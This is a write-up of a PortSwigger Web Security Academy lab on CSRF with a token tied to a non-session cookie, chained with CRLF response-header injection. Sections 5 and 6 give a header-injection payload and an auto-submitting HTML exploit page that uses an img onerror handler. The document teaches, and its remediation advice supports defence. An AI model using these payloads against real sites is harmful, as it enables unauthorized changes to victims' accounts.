CSRF — Token Tied to Non-Session Cookie

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite, Burp Repeater, HTML, Exploit Server
Status: ✅ Solved
Challenge: 30 Days of Web Security — Day 01

1. Objective

Identify and exploit a CSRF vulnerability in which the application validates a CSRF token against a separate cookie instead of binding the token to the authenticated session.

2. Attack Scenario

The attacker wants to change an authenticated victim's email address.

The application uses three relevant values:

session — identifies the authenticated user.
csrfKey — a separate cookie used by the CSRF protection mechanism.
csrf — a token submitted with the email change form.

The attacker discovers that the server accepts a matching csrfKey and csrf pair belonging to another user.

However, exploiting this through a victim's browser requires the attacker to influence the victim's csrfKey cookie.

The application's search feature provides the second vulnerability needed to accomplish this.

3. Request Analysis

The email change request contained:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>; csrfKey=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net&csrf=<REDACTED>

I first replaced the csrfKey cookie with an invalid value.

Result: Invalid CSRF token.

This showed that the cookie participated in the validation process.

4. Testing Token-to-Session Binding

I used two independent accounts, wiener and carlos.

I constructed a request containing:

session = WIENER_SESSION
csrfKey = CARLOS_CSRF_KEY
csrf    = CARLOS_CSRF_TOKEN

Result: The application accepted the request, and Wiener's email address changed.

This confirmed that the CSRF token was not securely bound to the authenticated session.

5. Discovering Cookie Injection

I investigated the application's search feature.

A normal search caused the search term to appear in a Set-Cookie response header.

I then tested a URL-encoded CRLF sequence in the search parameter:

GET /?search=test%0d%0aSet-Cookie:%20csrfKey=TEST123%3b%20SameSite=None HTTP/2
Host: <LAB-HOST>

Result: The response contained an additional Set-Cookie header for csrfKey.

This demonstrated HTTP response header injection, which could be used to influence the victim's CSRF-related cookie.

6. Exploit Chain

I combined the vulnerabilities using an HTML proof of concept hosted on the PortSwigger Exploit Server.

<!DOCTYPE html>
<html>
<body>

<form action="https://<LAB-HOST>/my-account/change-email"
      method="POST">

    <input type="hidden"
           name="email"
           value="csrf-lab05-victim@example.net">

    <input type="hidden"
           name="csrf"
           value="<ATTACKER_CSRF_TOKEN>">

</form>

<img src="https://<LAB-HOST>/?search=test%0d%0aSet-Cookie:%20csrfKey=<ATTACKER_CSRF_KEY>%3b%20SameSite=None"
     onerror="document.forms[0].submit()">

</body>
</html>

The image request triggers the vulnerable search endpoint.

The injected response header sets the attacker-controlled csrfKey cookie.

When the image fails to load, the onerror handler submits the email change form containing the matching CSRF token.

If the browser includes the victim's authenticated session, the server accepts the request.

7. Verification

I stored the HTML proof of concept and delivered it to the simulated victim through the PortSwigger Exploit Server.

Final result: The laboratory was marked as Solved.

8. Root Cause

The application incorrectly bound its CSRF token to a separate, attacker-influenceable cookie instead of securely associating it with the authenticated session.

The search feature also allowed CRLF injection into HTTP response headers.

Together, these issues enabled an attacker to establish a valid CSRF cookie/token pair in the victim's browser.

9. Security Impact

The confirmed impact was unauthorized modification of an authenticated user's email address.

Depending on additional account recovery and verification controls, this could contribute to account compromise.

Complete account takeover was not demonstrated.

10. Remediation
Bind CSRF tokens securely to authenticated sessions.
Reject mismatched or invalid CSRF tokens.
Prevent CRLF injection by validating user input and safely constructing HTTP headers.
Do not allow user-controlled data to create arbitrary Set-Cookie headers.
Use appropriate SameSite settings as defense in depth.
Require additional confirmation for sensitive account changes.
11. Key Takeaways

This laboratory demonstrated how two vulnerabilities can be chained together:

Weak CSRF token binding allowed a valid token/cookie pair from another user.
HTTP response header injection allowed the attacker to influence the victim's CSRF cookie.

The most important lesson is that a security mechanism must be evaluated as part of the complete attack flow, not in isolation.

Environment: PortSwigger Web Security Academy
Scope: Authorized educational laboratory only.
